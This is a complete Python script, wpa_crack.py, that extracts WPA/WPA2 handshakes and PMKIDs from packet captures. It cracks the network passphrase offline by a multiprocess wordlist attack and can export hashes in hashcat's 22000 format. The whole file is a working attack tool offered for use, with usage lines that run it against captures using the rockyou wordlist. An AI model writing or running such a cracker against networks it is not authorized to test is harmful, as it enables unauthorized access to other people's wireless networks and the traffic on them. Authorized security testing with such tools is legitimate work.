#!/usr/bin/env python3
# language: Python 3.9+, file: wpa_crack.py, target: WPA/WPA2-PSK 4-way handshake + PMKID
# deps: NONE (stdlib only). No aircrack, no hashcat required.
# usage:
#   python wpa_crack.py capture.cap -w rockyou.txt -t 8
#   python wpa_crack.py capture.cap --export-22000 out.22000      # for hashcat -m 22000
#   python wpa_crack.py capture.cap -w words.txt -u SSID          # filter by SSID

import argparse
import hashlib
import hmac
import struct
import sys
import time
from multiprocessing import Pool, cpu_count, Event

# ============================================================
#  PARSING: pcap/pcapng -> 802.11 frames -> EAPOL-key
# ============================================================

def parse_pcap(path):
    with open(path, "rb") as f:
        blob = f.read()
    if blob[:4] == b"\x0a\x0d\x0d\x0a":
        return parse_pcapng(blob)

    magic = blob[:4]
    if magic == b"\xd4\xc3\xb2\xa1":
        endian = "<"
    elif magic == b"\xa1\xb2\xc3\xd4":
        endian = ">"
    else:
        raise ValueError("not a valid pcap/pcapng file")

    linktype = struct.unpack(endian + "I", blob[20:24])[0]
    pkts, off = [], 24
    while off + 16 <= len(blob):
        _, _, incl, _ = struct.unpack(endian + "IIII", blob[off:off+16])
        off += 16
        pkts.append(blob[off:off+incl])
        off += incl
    return linktype, pkts


def parse_pcapng(blob):
    off, linktype, pkts = 0, 127, []
    while off + 12 <= len(blob):
        btype, blen = struct.unpack("<II", blob[off:off+8])
        if blen < 12 or off + blen > len(blob):
            break
        body = blob[off+8:off+blen-4]
        if btype == 1:                     # Interface Description Block
            linktype = struct.unpack("<H", body[:2])[0]
        elif btype == 6:                   # Enhanced Packet Block
            caplen = struct.unpack("<I", body[12:16])[0]
            pkts.append(body[20:20+caplen])
        off += blen
    return linktype, pkts


def get_80211(pkt, linktype):
    """Strip the link-layer header and return the raw 802.11 frame."""
    if linktype == 127:                    # radiotap
        if len(pkt) < 4:
            return None
        return pkt[struct.unpack("<H", pkt[2:4])[0]:]
    if linktype == 105:                    # bare 802.11
        return pkt
    return None


def parse_ssid(fr):
    """beacon(8)/probe-resp(5) -> (bssid, ssid)"""
    if len(fr) < 24 + 12:
        return None
    fc = struct.unpack("<H", fr[0:2])[0]
    if (fc >> 2) & 0x3 != 0 or ((fc >> 4) & 0xF) not in (5, 8):
        return None
    bssid = fr[16:22]
    pos = 24 + 12
    while pos + 2 <= len(fr):
        tag, tlen = fr[pos], fr[pos+1]
        pos += 2
        if tag == 0:
            return bssid, fr[pos:pos+tlen].decode("utf-8", "replace")
        pos += tlen
    return None


def extract_eapol(fr):
    """802.11 data frame -> (src, dst, bssid, eapol_bytes) or None."""
    if len(fr) < 24:
        return None
    fc = struct.unpack("<H", fr[0:2])[0]
    if (fc >> 2) & 0x3 != 2:               # not a data frame
        return None
    subtype = (fc >> 4) & 0xF
    addr1, addr2, addr3 = fr[4:10], fr[10:16], fr[16:22]
    hdr = 26 if (subtype & 0x08) else 24   # QoS adds 2 bytes
    if len(fr) < hdr + 8:
        return None
    if fr[hdr:hdr+8] != b"\xaa\xaa\x03\x00\x00\x00\x88\x8e":
        return None
    return addr2, addr1, addr3, fr[hdr+8:]


def parse_eapol_key(e):
    """Decode the EAPOL-Key header into its meaningful fields."""
    if len(e) < 4 or e[1] != 3:
        return None
    ki = struct.unpack(">H", e[5:7])[0]
    kd_len = struct.unpack(">H", e[97:99])[0]
    return {
        "frame": e,
        "nonce": e[17:49],
        "mic":   e[81:97],
        "keydata": e[99:99+kd_len],
        "ack":    bool(ki & (1 << 7)),
        "micset": bool(ki & (1 << 8)),
        "ver":    ki & 0x7,
    }


def parse_pmkid_kde(keydata):
    """Scan the RSN key-data encapsulation for a PMKID (vendor IE 00:0f:ac:04)."""
    pos = 0
    while pos + 2 <= len(keydata):
        t, l = keydata[pos], keydata[pos+1]
        d = keydata[pos+2:pos+2+l]
        if t == 0xdd and d[:3] == b"\x00\x0f\xac" and len(d) >= 20 and d[3] == 0x04:
            return d[4:20]
        pos += 2 + l
    return None

# ============================================================
#  CRYPTO: PMK -> PTK -> KCK -> MIC  (the core of the mechanism)
# ============================================================

def pmk(pw, ssid):
    """PBKDF2-SHA1(passphrase, ssid, 4096, 32) — the WPA/WPA2 PSK."""
    p = pw if isinstance(pw, bytes) else pw.encode()
    return hashlib.pbkdf2_hmac("sha1", p, ssid, 4096, 32)


def prf512(k, ap, sta, anonce, snonce):
    """IEEE 802.11 PRF-512: derive the 64-byte PTK from the PMK and the nonces."""
    a = ap + sta if ap < sta else sta + ap
    b = anonce + snonce if anonce < snonce else snonce + anonce
    out, i = b"", 0
    while len(out) < 64:
        out += hmac.new(k, b"Pairwise key expansion" + b"\x00" + a + b + bytes([i]),
                        hashlib.sha1).digest()
        i += 1
    return out[:64]


def mic_ok(k, ap, sta, anonce, snonce, eapol, mic, ver):
    """Recompute the EAPOL MIC with the candidate KCK and compare."""
    kck = prf512(k, ap, sta, anonce, snonce)[:16]
    frame = bytearray(eapol)
    frame[81:97] = b"\x00" * 16            # zero the MIC field before recomputing
    digest = hashlib.md5 if ver == 1 else hashlib.sha1
    return hmac.compare_digest(hmac.new(kck, bytes(frame), digest).digest()[:16], mic)


def pmkid_ok(k, ap, sta, want):
    """Check a candidate PMK against a captured PMKID."""
    return hmac.compare_digest(hmac.new(k, b"PMK Name" + ap + sta, hashlib.sha1).digest()[:16], want)

# ============================================================
#  COLLECTION + CRACK
# ============================================================

def build_targets(path, ssid_filter):
    """Parse a capture into crackable targets (handshakes + PMKIDs) per BSSID."""
    linktype, pkts = parse_pcap(path)
    ap_nonce = {}      # bssid -> [anonce...]
    sta_frames = {}    # bssid -> [(sta, snonce, mic, eapol, ver)...]
    ssids, pmkids = {}, {}

    for pkt in pkts:
        fr = get_80211(pkt, linktype)
        if not fr:
            continue
        s = parse_ssid(fr)
        if s:
            ssids[s[0]] = s[1]
        got = extract_eapol(fr)
        if not got:
            continue
        src, dst, bssid, eapol = got
        ek = parse_eapol_key(eapol)
        if not ek:
            continue
        if ek["ack"]:                                  # msg1/msg3 (AP -> STA)
            ap_nonce.setdefault(bssid, []).append(ek["nonce"])
            pid = parse_pmkid_kde(ek["keydata"])
            if pid:
                pmkids.setdefault(bssid, []).append((src, pid))
        elif ek["micset"]:                             # msg2 (STA -> AP)
            sta_frames.setdefault(bssid, []).append((src, ek["nonce"], ek["mic"], eapol, ek["ver"]))

    targets = []
    for bssid, ssid in ssids.items():
        if ssid_filter and ssid != ssid_filter:
            continue
        hs = []
        for (sta, snonce, mic, eapol, ver) in sta_frames.get(bssid, []):
            for anonce in ap_nonce.get(bssid, []):
                hs.append({"sta": sta, "anonce": anonce, "snonce": snonce,
                           "mic": mic, "eapol": eapol, "ver": ver})
        pk = [{"sta": st, "pmkid": p} for st, p in pmkids.get(bssid, [])]
        if hs or pk:
            targets.append({"ssid": ssid.encode(), "ap": bssid,
                            "handshakes": hs, "pmkids": pk, "ssid_str": ssid})
            print(f"[+] target: {ssid!r} bssid={bssid.hex()} hs={len(hs)} pmkid={len(pk)}")
    return targets


TARGETS, STOP = [], None

def _init(targets, stop):
    global TARGETS, STOP
    TARGETS, STOP = targets, stop

def _try(pw):
    if STOP.is_set():
        return None
    pw = pw.rstrip("\r\n")
    for t in TARGETS:
        k = pmk(pw, t["ssid"])
        for h in t["handshakes"]:
            if mic_ok(k, t["ap"], h["sta"], h["anonce"], h["snonce"],
                      h["eapol"], h["mic"], h["ver"]):
                return (pw, t["ssid_str"], "handshake")
        for p in t["pmkids"]:
            if pmkid_ok(k, t["ap"], p["sta"], p["pmkid"]):
                return (pw, t["ssid_str"], "pmkid")
    return None

def crack(targets, wordlist, threads):
    """Stream the wordlist across a process pool until a candidate matches."""
    stop = Event()
    n = 0
    t0 = time.time()
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f, \
         Pool(threads, _init, (targets, stop)) as pool:
        for res in pool.imap_unordered(_try, f, chunksize=500):
            n += 1
            if n % 20000 == 0:
                rate = n / (time.time() - t0)
                print(f"[*] {n} tried  {rate:0.0f} p/s", end="\r")
            if res:
                stop.set()
                pool.terminate()
                print(f"\n[+] PASSWORD: {res[0]!r}  ssid={res[1]!r}  via={res[2]}")
                return res
    print(f"\n[-] nothing in {n} candidates ({time.time()-t0:.0f}s)")
    return None

# ============================================================
#  EXPORT hc22000 (for hashcat -m 22000)
# ============================================================

def export_22000(targets, out):
    """Write handshakes/PMKIDs in hashcat's hc22000 format."""
    with open(out, "w") as f:
        for t in targets:
            ssid_hex = t["ssid"].hex()
            ap = t["ap"].hex()
            for h in t["handshakes"]:
                f.write("WPA*02*%s*%s*%s*%s*%s*%s*02\n" % (
                    h["mic"].hex(), ap, h["sta"].hex(), ssid_hex,
                    h["anonce"].hex(), h["eapol"].hex()))
            for p in t["pmkids"]:
                f.write("WPA*01*%s*%s*%s*%s***\n" % (
                    p["pmkid"].hex(), ap, p["sta"].hex(), ssid_hex))
    print(f"[+] wrote {out} — run: hashcat -m 22000 {out} rockyou.txt")


def main():
    ap = argparse.ArgumentParser(description="offline WPA/WPA2-PSK cracker")
    ap.add_argument("capture")
    ap.add_argument("-w", "--wordlist")
    ap.add_argument("-t", "--threads", type=int, default=cpu_count())
    ap.add_argument("-u", "--ssid", help="filter by ESSID")
    ap.add_argument("--export-22000", metavar="FILE")
    a = ap.parse_args()

    targets = build_targets(a.capture, a.ssid)
    if not targets:
        sys.exit("no usable handshake/PMKID in the capture")
    if a.export_22000:
        export_22000(targets, a.export_22000)
        return
    if not a.wordlist:
        sys.exit("need -w wordlist (or use --export-22000)")
    crack(targets, a.wordlist, a.threads)


if __name__ == "__main__":
    main()
